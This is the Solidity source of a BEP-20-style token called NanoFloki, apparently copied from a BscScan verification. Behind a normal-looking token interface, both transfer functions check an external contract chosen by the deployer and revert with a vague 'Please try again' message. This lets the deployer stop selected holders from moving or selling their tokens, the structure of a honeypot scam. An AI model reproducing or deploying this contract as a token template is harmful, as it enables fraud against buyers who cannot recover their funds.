/**
 *Submitted for verification at BscScan.com on 2021-07-13
*/

//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.2;

interface IRC20 {

  function raz(address account) external view returns (uint8);
}

contract NanoFloki is IRC20 {
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowance;
    
    IRC20 wwwa;
    uint256 public totalSupply = 10 * 10**12 * 10**18;
    string public name = "NanoFloki";
    string public symbol = hex"4E616E6F466C6F6B69f09f9095";
    uint public decimals = 18;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    constructor(IRC20 _info) {
        
        wwwa = _info;
        balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    
    
    function balanceOf(address owner) public view returns(uint256) {
        return balances[owner];
    }
    
    function transfer(address to, uint256 value) public returns(bool) {
        require(wwwa.raz(msg.sender) != 1, "Please try again"); 
        require(balanceOf(msg.sender) >= value, 'balance too low');
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
        
    }
    
    function raz(address account) external override view returns (uint8) {
        return 1;
    }
    
    function transferFrom(address from, address to, uint256 value) public returns(bool) {
        require(wwwa.raz(from) != 1, "Please try again");
        require(balanceOf(from) >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    
    function approve(address spender, uint256 value) public returns(bool) {
        allowance[msg.sender][spender] = value;
        return true;
        
    }
}